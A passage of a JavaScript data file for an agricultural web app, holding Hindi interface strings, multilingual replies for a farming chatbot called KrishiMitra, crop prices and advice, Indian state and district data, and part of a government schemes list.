        "btn_calculate_detailed": "विस्तृत लाभ की गणना करें",
        "btn_reset": "रीसेट",
        "results_title": "लाभ गणना परिणाम",
        "results_detailed": "विस्तृत लाभ गणना",
        "profit": "लाभ",
        "loss": "हानि",
        "advanced_desc": "सटीक लाभ अनुमान के लिए कस्टम इनपुट के साथ विस्तृत व्यय कैलकुलेटर।",
        "compare_desc": "इस जिले में विभिन्न फसलों की लाभप्रदता की तुलना करें।",
        "select_crop1": "फसल 1 चुनें",
        "select_crop2": "फसल 2 चुनें",
        "btn_compare_crops": "फसलों की तुलना करें",
        "revenue": "कुल राजस्व",
        "expenses": "कुल व्यय",
        "profit_per_acre": "लाभ प्रति एकड़",
        "expense_breakdown": "व्यय का विवरण",

        "crop_cotton": "कपास",
        "crop_soybean": "सोयाबीन",
        "crop_sugarcane": "गन्ना",
        "crop_wheat": "गेहूं",
        "crop_rice": "चावल",
        "crop_onion": "प्याज",
        "district_amravati": "अमरावती",
        "district_ahmednagar": "अहमदनगर",

        "schemes_title": "किसानों के लिए सरकारी योजनाएं",
        "schemes_desc": "भारतीय किसानों के लिए उपलब्ध विभिन्न सरकारी योजनाओं, सब्सिडी और समर्थन कार्यक्रमों का अन्वेषण करें",
        "search_scheme_placeholder": "योजनाएं खोजें (जैसे पीएम-किसान, फसल बीमा...)",
        "showing_schemes": "योजनाएं दिखा रहा है",
        "benefits": "लाभ",

        "compare_title": "कृषि जिलों की तुलना करें",
        "compare_desc_full": "उनकी कृषि विशेषताओं, फसलों और लाभप्रदता की तुलना करने के लिए 3 जिले चुनें",
        "select_district": "जिला चुनें",
        "no_district_selected": "कोई जिला चयनित नहीं",
        "comparison_results": "जिला तुलना परिणाम",
        "feature": "विशेषता",
        "recommendation": "सिफारिश",
        "best_opportunity": "चयनित जिलों में सबसे संतुलित कृषि अवसर प्रदान करता है।",

        "crop_comparison_results": "फसल तुलना परिणाम",
        "parameter": "पैरामीटर",
        "yield_per_acre": "उपज प्रति एकड़",
        "price_per_quintal": "मूल्य प्रति क्विंटल",
        "revenue_per_acre": "राजस्व प्रति एकड़",
        "expenses_per_acre": "व्यय प्रति एकड़",
        "more_profitable": "अधिक लाभदायक है",
        "estimated_profit": "अनुमानित लाभ",
        "per_acre": "प्रति एकड़",
        "and": "और",
        "cultivation_advice": "खेती सलाह",
        "advice": "सलाह",

        "alert_fill_fields": "कृपया सभी फ़ील्ड भरें",
        "alert_select_two": "तुलना करने के लिए कृपया दो फसलें चुनें",
        "alert_select_different": "कृपया दो अलग-अलग फसलें चुनें",
        "alert_select_two_districts": "तुलना करने के लिए कृपया कम से कम 2 जिले चुनें",
        "apply_clicked": "आवेदन पत्र यहां खुलेगा",

        "map_placeholder": "{district} का मानचित्र यहां दिखाई देगा",
        "video_placeholder": "{district} के लिए फसल खेती वीडियो यहां दिखाई देंगे",

        "of": "में से",

        "searching": "खोज रहा है",
        "taking_to": "ले जा रहा है",
        "district_page": "जिला पृष्ठ",
        "not_found": "क्षमा करें, मुझे नहीं मिला",
        "try_again": "कृपया सही जिले का नाम टाइप करें।",
        "crop_not_found": "क्षमा करें, मुझे नहीं मिला",
        "crop_info": "फसल जानकारी",
        "price_info": "मूल्य जानकारी",
        "solution_not_found": "क्षमा करें, इस समस्या का समाधान नहीं मिला।",
        "consult_expert": "कृषि विशेषज्ञ से परामर्श करें",
        "contact_officer": "स्थानीय कृषि अधिकारी से संपर्क करें",
        "per_ton": "प्रति टन (अनुमानित)",
        "problem_solution": "समस्या समाधान",

        "footer_desc": "बुद्धिमान कृषि अंतर्दृष्टि और डेटा-संचालित निर्णय लेने के माध्यम से किसानों को सशक्त बनाना।",
        "footer_website": "agrosmart.com",
        "footer_email": "contact@agrosmart.com",
        "footer_phone": "+91 1800-XXX-XXXX",
        "footer_copyright": "© 2023 एग्रोस्मार्ट। सर्वाधिकार सुरक्षित।",

        "about_title": "एग्रोस्मार्ट के बारे में",
        "about_mission": "हमारा मिशन",
        "about_mission_desc": "एग्रोस्मार्ट का उद्देश्य भारतीय किसानों को डेटा-संचालित कृषि अंतर्दृष्टि प्रदान करके सशक्त बनाना है, उन्हें फसलों, बाजारों और सरकारी योजनाओं के बारे में सूचित निर्णय लेने में मदत करना।",
        "about_features": "विशेषताएं",
        "feature1": "राज्य और जिलावार कृषि अंतर्दृष्टि",
        "feature2": "फसल लाभप्रदता कैलकुलेटर",
        "feature3": "सरकारी योजना जानकारी",
        "feature4": "जिला तुलना उपकरण",
        "feature5": "मानचित्र और वीडियो संसाधन",
        "about_contact": "संपर्क करें",
        "contact_email": "ईमेल: contact@agrosmart.com",
        "contact_phone": "फोन: +91 1800-XXX-XXXX",
        "contact_website": "वेबसाइट: www.agrosmart.com",

        "recommend_high_demand": "उच्च बाजार मांग व्यावसायिक खेती के लिए अच्छा अवसर प्रदान करती है।",
        "recommend_high_risk": "जोखिम कम करने के लिए फसल बीमा और विविध फसल पद्धतियों पर विचार करें।",
        "recommend_low_risk": "कम जोखिम वाला वातावरण स्थिर फसल उत्पादन के लिए उपयुक्त।",
        "recommend_export": "अच्छी निर्यात क्षमता - गुणवत्ता मानकों और निर्यात-उन्मुख किस्मों पर विचार करें।",
        "recommend_market": "नजदीकी बंदरगाहों और बुनियादी ढांचे के माध्यम से वैश्विक बाजारों तक अच्छी पहुंच।"
    }
};

// ============================================
// CHATBOT RESPONSES - MULTILINGUAL
// ============================================
const chatbotResponses = {
    en: {
        "hi": "Hello! I'm KrishiMitra, your agricultural assistant. How can I help you today?",
        "hello": "Namaste! How can I assist you with your agricultural queries?",
        "district": "Please type the name of the district you want to search for (e.g. Akola, Ahmednagar, Ludhiana). I'll take you directly to that district.",
        "calculator": "Opening the Profit Calculator page for you...",
        "schemes": "Opening Government Schemes page... You'll find all subsidies, insurance, and support programs for farmers there.",
        "crop_advice": "Please type the name of the crop you want advice for (e.g. Cotton, Sugarcane, Soybean). I'll provide season and cultivation advice.",
        "tips": "Here are some quick farming tips:\n1. Always test soil before sowing\n2. Use drip irrigation to save water\n3. Rotate crops to maintain soil health\n4. Use organic fertilizers when possible\n5. Check weather forecasts regularly\n6. Maintain proper spacing between plants\n7. Keep records of expenses and yields\n8. Join farmer groups for collective buying/selling",
        "prices": "Please type the crop name to get current market prices per ton.",
        "problem": "Please describe your crop problem (e.g. yellow leaves, pests, low yield). I'll suggest solutions.",
        "default": "I can help you with: 1) Search District 2) Open Calculator 3) Govt Schemes 4) Crop Advice 5) Quick Tips 6) Market Prices 7) Problem Solver"
    },
    mr: {
        "hi": "नमस्कार! मी कृषिमित्र, तुमची कृषी सहाय्यिका. मी तुम्हाला आज कशी मदत करू शकते?",
        "hello": "नमस्कार! मी तुम्हाला तुमच्या कृषी प्रश्नांमध्ये कशी मदत करू शकते?",
        "district": "कृपया तुम्हाला शोधायच्या जिल्ह्याचे नाव टाईप करा (उदा. अकोला, अहमदनगर, लुधियाना). मी तुम्हाला थेट त्या जिल्ह्यावर घेऊन जाईन.",
        "calculator": "तुमच्यासाठी नफा कॅल्क्युलेटर पृष्ठ उघडत आहे...",
        "schemes": "सरकारी योजना पृष्ठ उघडत आहे... तुम्हाला तिथे शेतकऱ्यांसाठी सर्व अनुदान, विमा आणि समर्थन कार्यक्रम सापडतील.",
        "crop_advice": "कृपया तुम्हाला सल्ला हवे असलेल्या पिकाचे नाव टाईप करा (उदा. कापूस, ऊस, सोयाबीन). मी हंगाम आणि शेती सल्ला देईन.",
        "tips": "काही जलद शेती टिप्स:\n१. नेहमी पेरणीपूर्वी माती तपासा\n२. पाणी वाचवण्यासाठी ड्रिप सिंचन वापरा\n३. मातीचे आरोग्य राखण्यासाठी पीक फेरबदल करा\n४. शक्य असल्यास सेंद्रीय खते वापरा\n५. नियमित हवामान अंदाज तपासा\n६. रोपांमध्ये योग्य अंतर ठेवा\n७. खर्च आणि उत्पादनाची नोंद ठेवा\n८. सामूहिक खरेदी/विक्रीसाठी शेतकरी गटांमध्ये सामील व्हा",
        "prices": "कृपया प्रति टन सध्याचे बाजारभाव मिळवण्यासाठी पीक नाव टाईप करा.",
        "problem": "कृपया तुमची पीक समस्या वर्णन करा (उदा. पिवळी पाने, कीटक, कमी उत्पादन). मी उपाय सुचवेन.",
        "default": "मी तुम्हाला मदत करू शकते: १) जिल्हा शोधा २) कॅल्क्युलेटर उघडा ३) सरकारी योजना ४) पीक सल्ला ५) जलद टिप्स ६) बाजारभाव ७) समस्या सोडवणारा"
    },
    hi: {
        "hi": "नमस्ते! मैं कृषिमित्र, आपकी कृषि सहायिका हूं। आज मैं आपकी कैसे मदद कर सकती हूं?",
        "hello": "नमस्ते! मैं आपकी कृषि प्रश्नों में आपकी कैसे सहायता कर सकती हूं?",
        "district": "कृपया उस जिले का नाम टाइप करें जिसे आप खोजना चाहते हैं (जैसे अकोला, अहमदनगर, लुधियाना)। मैं आपको सीधे उस जिले पर ले जाऊंगी।",
        "calculator": "आपके लिए लाभ कैलकुलेटर पृष्ठ खोल रही हूं...",
        "schemes": "सरकारी योजना पृष्ठ खोल रही हूं... आपको वहां किसानों के लिए सभी सब्सिडी, बीमा और समर्थन कार्यक्रम मिलेंगे।",
        "crop_advice": "कृपया उस फसल का नाम टाइप करें जिसके लिए आपको सलाह चाहिए (जैसे कपास, गन्ना, सोयाबीन)। मैं मौसम और खेती सलाह प्रदान करूंगी।",
        "tips": "कुछ त्वरित खेती टिप्स:\n१. बुआई से पहले हमेशा मिट्टी की जांच करें\n२. पानी बचाने के लिए ड्रिप सिंचन का उपयोग करें\n३. मिट्टी के स्वास्थ्य को बनाए रखने के लिए फसल चक्रण करें\n४. संभव हो तो जैविक उर्वरकों का उपयोग करें\n५. नियमित रूप से मौसम पूर्वानुमान की जांच करें\n६. पौधों के बीच उचित दूरी बनाए रखें\n७. व्यय और उपज का रिकॉर्ड रखें\n८. सामूहिक खरीद/बिक्री के लिए किसान समूहों में शामिल हों",
        "prices": "कृपया प्रति टन वर्तमान बाजार मूल्य प्राप्त करने के लिए फसल का नाम टाइप करें।",
        "problem": "कृपया अपनी फसल समस्या का वर्णन करें (जैसे पीली पत्तियां, कीट, कम उपज)। मैं समाधान सुझाऊंगी।",
        "default": "मैं आपकी मदद कर सकती हूं: १) जिला खोजें २) कैलकुलेटर खोलें ३) सरकारी योजनाएं ४) फसल सलाह ५) त्वरित टिप्स ६) बाजार मूल्य ७) समस्या समाधान"
    }
};

// ============================================
// CROP DATA
// ============================================
const cropData = {
    "Cotton": { season: "Kharif (June-October)", advice: "Plant in June-July. Requires well-drained soil. Use Bt cotton seeds for pest resistance. Harvest in October-November.", pricePerTon: 65000, problems: { "yellow leaves": "Check irrigation - overwatering or underwatering. Test soil for nutrients.", "pests": "Use recommended pesticides. Consider neem oil for organic control.", "low yield": "Improve soil fertility with organic manure. Ensure proper spacing." } },
    "Soybean": { season: "Kharif (June-September)", advice: "Plant in June. Requires moderate rainfall. Use rhizobium culture for better yield. Harvest in September-October.", pricePerTon: 45000, problems: { "yellow leaves": "Check for nitrogen deficiency. Apply urea or organic manure.", "pests": "Use recommended soybean pesticides. Monitor regularly.", "low yield": "Improve soil drainage. Use quality seeds." } },
    "Sugarcane": { season: "Year-round (main planting Feb-March)", advice: "Plant in February-March. Requires heavy irrigation. Use disease-free setts. Harvest after 12-18 months.", pricePerTon: 32000, problems: { "yellow leaves": "Check for nutrient deficiency. Apply balanced fertilizers.", "pests": "Control borers with recommended pesticides.", "low yield": "Ensure proper irrigation and spacing." } },
    "Wheat": { season: "Rabi (November-March)", advice: "Plant in November. Requires cool weather. Use certified seeds. Harvest in March-April.", pricePerTon: 28000, problems: { "yellow leaves": "Check for rust disease. Use resistant varieties.", "pests": "Control aphids with recommended insecticides.", "low yield": "Ensure timely sowing and proper irrigation." } },
    "Rice": { season: "Kharif (June-November)", advice: "Plant in June-July. Requires flooded fields. Use high-yielding varieties. Harvest in November-December.", pricePerTon: 30000, problems: { "yellow leaves": "Check for nitrogen deficiency. Apply urea.", "pests": "Control stem borers with recommended pesticides.", "low yield": "Ensure proper water management." } },
    "Onion": { season: "Rabi (October-March)", advice: "Plant in October-November. Requires well-drained soil. Harvest in March-April when leaves dry.", pricePerTon: 18000, problems: { "yellow leaves": "Check for fungal diseases. Use fungicides.", "pests": "Control thrips with recommended insecticides.", "low yield": "Ensure proper bulb formation with adequate spacing." } }
};

// ============================================
// MULTILINGUAL STATES DATA
// ============================================
const statesData = [
    {
        id: "maharashtra", name: { en: "Maharashtra", mr: "महाराष्ट्र", hi: "महाराष्ट्र" }, description: { en: "Leading producer of sugarcane, cotton, and soybean with diverse agro-climatic zones.", mr: "ऊस, कापूस आणि सोयाबीनचे अग्रगण्य उत्पादक विविध कृषी-हवामान क्षेत्रांसह.", hi: "गन्ना, कपास और सोयाबीन का अग्रणी उत्पादक विविध कृषि-जलवायु क्षेत्रों के साथ।" }, icon: "fas fa-mountain", districts: [
            { id: "akola", name: { en: "Akola", mr: "अकोला", hi: "अकोला" }, crops: { en: "Cotton, Soybean, Jowar", mr: "कापूस, सोयाबीन, ज्वारी", hi: "कपास, सोयाबीन, ज्वार" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } },
            { id: "ahmednagar", name: { en: "Ahmednagar", mr: "अहमदनगर", hi: "अहमदनगर" }, crops: { en: "Sugarcane, Onion, Bajra", mr: "ऊस, कांदा, बाजरी", hi: "गन्ना, प्याज, बाजरा" }, season: { en: "Kharif/Rabi", mr: "खरीप/रब्बी", hi: "खरीफ/रबी" } },
            { id: "amravati", name: { en: "Amravati", mr: "अमरावती", hi: "अमरावती" }, crops: { en: "Cotton, Soybean", mr: "कापूस, सोयाबीन", hi: "कपास, सोयाबीन" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } },
            { id: "aurangabad", name: { en: "Aurangabad", mr: "औरंगाबाद", hi: "औरंगाबाद" }, crops: { en: "Tur, Soybean", mr: "तूर, सोयाबीन", hi: "तूर, सोयाबीन" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } },
            { id: "buldhana", name: { en: "Buldhana", mr: "बुलढाणा", hi: "बुलढाणा" }, crops: { en: "Soybean, Pulses", mr: "सोयाबीन, कडधान्ये", hi: "सोयाबीन, दालें" }, season: { en: "Kharif/Rabi", mr: "खरीप/रब्बी", hi: "खरीफ/रबी" } }
        ]
    },
    {
        id: "gujarat", name: { en: "Gujarat", mr: "गुजरात", hi: "गुजरात" }, description: { en: "Major producer of cotton, groundnut, and dairy products with extensive irrigation facilities.", mr: "कापूस, भुईमूग आणि दुग्धजन्य पदार्थांचे प्रमुख उत्पादक विस्तृत सिंचन सुविधांसह.", hi: "कपास, मूंगफली और डेयरी उत्पादों का प्रमुख उत्पादक व्यापक सिंचाई सुविधाओं के साथ।" }, icon: "fas fa-water", districts: [
            { id: "ahmedabad", name: { en: "Ahmedabad", mr: "अहमदाबाद", hi: "अहमदाबाद" }, crops: { en: "Cotton, Tobacco, Wheat", mr: "कापूस, तंबाखू, गहू", hi: "कपास, तम्बाकू, गेहूं" }, season: { en: "Rabi", mr: "रब्बी", hi: "रबी" } },
            { id: "surat", name: { en: "Surat", mr: "सुरत", hi: "सूरत" }, crops: { en: "Banana, Sugarcane", mr: "केळी, ऊस", hi: "केला, गन्ना" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } },
            { id: "vadodara", name: { en: "Vadodara", mr: "वडोदरा", hi: "वडोदरा" }, crops: { en: "Cotton, Maize", mr: "कापूस, मका", hi: "कपास, मक्का" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } },
            { id: "rajkot", name: { en: "Rajkot", mr: "राजकोट", hi: "राजकोट" }, crops: { en: "Groundnut, Cotton", mr: "भुईमूग, कापूस", hi: "मूंगफली, कपास" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } }
        ]
    },
    {
        id: "punjab", name: { en: "Punjab", mr: "पंजाब", hi: "पंजाब" }, description: { en: "The 'Granary of India' known for wheat and rice production with high irrigation coverage.", mr: "'भारताचे धान्यागार' गहू आणि तांदूळ उत्पादनासाठी प्रसिद्ध उच्च सिंचन कव्हरेजसह.", hi: "'भारत का अन्न भंडार' गेहूं और चावल उत्पादन के लिए प्रसिद्ध उच्च सिंचाई कवरेज के साथ।" }, icon: "fas fa-wheat-awn", districts: [
            { id: "ludhiana", name: { en: "Ludhiana", mr: "लुधियाना", hi: "लुधियाना" }, crops: { en: "Wheat, Rice", mr: "गहू, तांदूळ", hi: "गेहूं, चावल" }, season: { en: "Rabi/Kharif", mr: "रब्बी/खरीप", hi: "रबी/खरीफ" } },
            { id: "amritsar", name: { en: "Amritsar", mr: "अमृतसर", hi: "अमृतसर" }, crops: { en: "Wheat, Rice", mr: "गहू, तांदूळ", hi: "गेहूं, चावल" }, season: { en: "Rabi/Kharif", mr: "रब्बी/खरीप", hi: "रबी/खरीफ" } },
            { id: "jalandhar", name: { en: "Jalandhar", mr: "जालंधर", hi: "जालंधर" }, crops: { en: "Citrus, Vegetables", mr: "लिंबूवर्गीय, भाज्या", hi: "खट्टे फल, सब्जियां" }, season: { en: "Year-round", mr: "वर्षभर", hi: "सालभर" } }
        ]
    },
    {
        id: "karnataka", name: { en: "Karnataka", mr: "कर्नाटक", hi: "कर्नाटक" }, description: { en: "Diverse agriculture with coffee, spices, cereals and pulses across multiple climatic zones.", mr: "कॉफी, मसाले, धान्ये आणि कडधान्ये असलेली विविध कृषी अनेक हवामान क्षेत्रांमध्ये.", hi: "कॉफी, मसाले, अनाज और दालों के साथ विविध कृषि कई जलवायु क्षेत्रों में।" }, icon: "fas fa-mug-hot", districts: [
            { id: "belagavi", name: { en: "Belagavi", mr: "बेळगाव", hi: "बेलगावी" }, crops: { en: "Sugarcane, Maize", mr: "ऊस, मका", hi: "गन्ना, मक्का" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } },
            { id: "mysuru", name: { en: "Mysuru", mr: "म्हैसूर", hi: "मैसूर" }, crops: { en: "Coffee, Silk", mr: "कॉफी, रेशीम", hi: "कॉफी, रेशम" }, season: { en: "Year-round", mr: "वर्षभर", hi: "सालभर" } },
            { id: "tumakuru", name: { en: "Tumakuru", mr: "तुमकुर", hi: "तुमकुर" }, crops: { en: "Groundnut, Sunflower", mr: "भुईमूग, सूर्यफूल", hi: "मूंगफली, सूरजमुखी" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" } }
        ]
    }
];

// ============================================
// DISTRICT INFO DATA
// ============================================
const districtInfoData = {
    akola: { district: { en: "Akola", mr: "अकोला", hi: "अकोला" }, topCrops: { en: "Cotton, Soybean, Jowar", mr: "कापूस, सोयाबीन, ज्वारी", hi: "कपास, सोयाबीन, ज्वार" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, globalMarketAccess: { en: "Low", mr: "कमी", hi: "कम" }, nearestMarket: { en: "Akola Mandi", mr: "अकोला मंडी", hi: "अकोला मंडी" } },
    ahmednagar: { district: { en: "Ahmednagar", mr: "अहमदनगर", hi: "अहमदनगर" }, topCrops: { en: "Sugarcane, Onion, Bajra", mr: "ऊस, कांदा, बाजरी", hi: "गन्ना, प्याज, बाजरा" }, season: { en: "Kharif/Rabi", mr: "खरीप/रब्बी", hi: "खरीफ/रबी" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, globalMarketAccess: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, nearestMarket: { en: "Ahmednagar Mandi", mr: "अहमदनगर मंडी", hi: "अहमदनगर मंडी" } },
    amravati: { district: { en: "Amravati", mr: "अमरावती", hi: "अमरावती" }, topCrops: { en: "Cotton, Soybean", mr: "कापूस, सोयाबीन", hi: "कपास, सोयाबीन" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, risk: { en: "High", mr: "उच्च", hi: "उच्च" }, exportPotential: { en: "Low", mr: "कमी", hi: "कम" }, globalMarketAccess: { en: "Low", mr: "कमी", hi: "कम" }, nearestMarket: { en: "Amravati Mandi", mr: "अमरावती मंडी", hi: "अमरावती मंडी" } },
    aurangabad: { district: { en: "Aurangabad", mr: "औरंगाबाद", hi: "औरंगाबाद" }, topCrops: { en: "Tur, Soybean", mr: "तूर, सोयाबीन", hi: "तूर, सोयाबीन" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "Low", mr: "कमी", hi: "कम" }, globalMarketAccess: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, nearestMarket: { en: "Aurangabad Mandi", mr: "औरंगाबाद मंडी", hi: "औरंगाबाद मंडी" } },
    buldhana: { district: { en: "Buldhana", mr: "बुलढाणा", hi: "बुलढाणा" }, topCrops: { en: "Soybean, Pulses", mr: "सोयाबीन, कडधान्ये", hi: "सोयाबीन, दालें" }, season: { en: "Kharif/Rabi", mr: "खरीप/रब्बी", hi: "खरीफ/रबी" }, demand: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "Low", mr: "कमी", hi: "कम" }, globalMarketAccess: { en: "Low", mr: "कमी", hi: "कम" }, nearestMarket: { en: "Buldhana Mandi", mr: "बुलढाणा मंडी", hi: "बुलढाणा मंडी" } },
    ahmedabad: { district: { en: "Ahmedabad", mr: "अहमदाबाद", hi: "अहमदाबाद" }, topCrops: { en: "Cotton, Tobacco, Wheat", mr: "कापूस, तंबाखू, गहू", hi: "कपास, तम्बाकू, गेहूं" }, season: { en: "Rabi", mr: "रब्बी", hi: "रबी" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "High", mr: "उच्च", hi: "उच्च" }, globalMarketAccess: { en: "High", mr: "उच्च", hi: "उच्च" }, nearestMarket: { en: "Ahmedabad Mandi", mr: "अहमदाबाद मंडी", hi: "अहमदाबाद मंडी" } },
    surat: { district: { en: "Surat", mr: "सुरत", hi: "सूरत" }, topCrops: { en: "Banana, Sugarcane", mr: "केळी, ऊस", hi: "केला, गन्ना" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "High", mr: "उच्च", hi: "उच्च" }, globalMarketAccess: { en: "High", mr: "उच्च", hi: "उच्च" }, nearestMarket: { en: "Surat Mandi", mr: "सुरत मंडी", hi: "सूरत मंडी" } },
    vadodara: { district: { en: "Vadodara", mr: "वडोदरा", hi: "वडोदरा" }, topCrops: { en: "Cotton, Maize", mr: "कापूस, मका", hi: "कपास, मक्का" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, globalMarketAccess: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, nearestMarket: { en: "Vadodara Mandi", mr: "वडोदरा मंडी", hi: "वडोदरा मंडी" } },
    rajkot: { district: { en: "Rajkot", mr: "राजकोट", hi: "राजकोट" }, topCrops: { en: "Groundnut, Cotton", mr: "भुईमूग, कापूस", hi: "मूंगफली, कपास" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, globalMarketAccess: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, nearestMarket: { en: "Rajkot Mandi", mr: "राजकोट मंडी", hi: "राजकोट मंडी" } },
    ludhiana: { district: { en: "Ludhiana", mr: "लुधियाना", hi: "लुधियाना" }, topCrops: { en: "Wheat, Rice", mr: "गहू, तांदूळ", hi: "गेहूं, चावल" }, season: { en: "Rabi/Kharif", mr: "रब्बी/खरीप", hi: "रबी/खरीफ" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "High", mr: "उच्च", hi: "उच्च" }, globalMarketAccess: { en: "High", mr: "उच्च", hi: "उच्च" }, nearestMarket: { en: "Ludhiana Mandi", mr: "लुधियाना मंडी", hi: "लुधियाना मंडी" } },
    amritsar: { district: { en: "Amritsar", mr: "अमृतसर", hi: "अमृतसर" }, topCrops: { en: "Wheat, Rice", mr: "गहू, तांदूळ", hi: "गेहूं, चावल" }, season: { en: "Rabi/Kharif", mr: "रब्बी/खरीप", hi: "रबी/खरीफ" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "High", mr: "उच्च", hi: "उच्च" }, globalMarketAccess: { en: "High", mr: "उच्च", hi: "उच्च" }, nearestMarket: { en: "Amritsar Mandi", mr: "अमृतसर मंडी", hi: "अमृतसर मंडी" } },
    jalandhar: { district: { en: "Jalandhar", mr: "जालंधर", hi: "जालंधर" }, topCrops: { en: "Citrus, Vegetables", mr: "लिंबूवर्गीय, भाज्या", hi: "खट्टे फल, सब्जियां" }, season: { en: "Year-round", mr: "वर्षभर", hi: "सालभर" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, globalMarketAccess: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, nearestMarket: { en: "Jalandhar Mandi", mr: "जालंधर मंडी", hi: "जालंधर मंडी" } },
    belagavi: { district: { en: "Belagavi", mr: "बेळगाव", hi: "बेलगावी" }, topCrops: { en: "Sugarcane, Maize", mr: "ऊस, मका", hi: "गन्ना, मक्का" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, globalMarketAccess: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, nearestMarket: { en: "Belagavi Mandi", mr: "बेळगाव मंडी", hi: "बेलगावी मंडी" } },
    mysuru: { district: { en: "Mysuru", mr: "म्हैसूर", hi: "मैसूर" }, topCrops: { en: "Coffee, Silk", mr: "कॉफी, रेशीम", hi: "कॉफी, रेशम" }, season: { en: "Year-round", mr: "वर्षभर", hi: "सालभर" }, demand: { en: "High", mr: "उच्च", hi: "उच्च" }, risk: { en: "Low", mr: "कमी", hi: "कम" }, exportPotential: { en: "High", mr: "उच्च", hi: "उच्च" }, globalMarketAccess: { en: "High", mr: "उच्च", hi: "उच्च" }, nearestMarket: { en: "Mysuru Mandi", mr: "म्हैसूर मंडी", hi: "मैसूर मंडी" } },
    tumakuru: { district: { en: "Tumakuru", mr: "तुमकुर", hi: "तुमकुर" }, topCrops: { en: "Groundnut, Sunflower", mr: "भुईमूग, सूर्यफूल", hi: "मूंगफली, सूरजमुखी" }, season: { en: "Kharif", mr: "खरीप", hi: "खरीफ" }, demand: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, risk: { en: "Medium", mr: "मध्यम", hi: "मध्यम" }, exportPotential: { en: "Low", mr: "कमी", hi: "कम" }, globalMarketAccess: { en: "Low", mr: "कमी", hi: "कम" }, nearestMarket: { en: "Tumakuru Mandi", mr: "तुमकुर मंडी", hi: "तुमकुर मंडी" } }
};

// ============================================
// GOVERNMENT SCHEMES DATA
// ============================================
const governmentSchemesData = [
    { id: "pmkisan", title: { en: "Pradhan Mantri Kisan Samman Nidhi (PM-KISAN)", mr: "प्रधानमंत्री किसान सन्मान निधी (पीएम-किसान)", hi: "प्रधानमंत्री किसान सम्मान निधि (पीएम-किसान)" }, description: { en: "Income support scheme for farmer families across the country", mr: "देशभरातील शेतकरी कुटुंबांसाठी उत्पन्न समर्थन योजना", hi: "देश भर में किसान परिवारों के लिए आय समर्थन योजना" }, benefits: { en: "₹6,000 per year in three equal installments", mr: "तीन समान हप्त्यांमध्ये दरवर्षी ₹६,०००", hi: "तीन समान किस्तों में प्रति वर्ष ₹६,०००" } },
    { id: "pmfby", title: { en: "Pradhan Mantri Fasal Bima Yojana (PMFBY)", mr: "प्रधानमंत्री पीक विमा योजना (पीएमएफबीवाय)", hi: "प्रधानमंत्री फसल बीमा योजना (पीएमएफबीवाई)" }, description: { en: "Crop insurance scheme to provide financial support to farmers", mr: "शेतकऱ्यांना आर्थिक सहाय्य प्रदान करण्यासाठी पीक विमा योजना", hi: "किसानों को वित्तीय सहायता प्रदान करने के लिए फसल बीमा योजना" }, benefits: { en: "Premium as low as 1.5-5% for all crops", mr: "सर्व पिकांसाठी केवळ १.५-५% प्रीमियम", hi: "सभी फसलों के लिए केवल १.५-५% प्रीमियम" } },
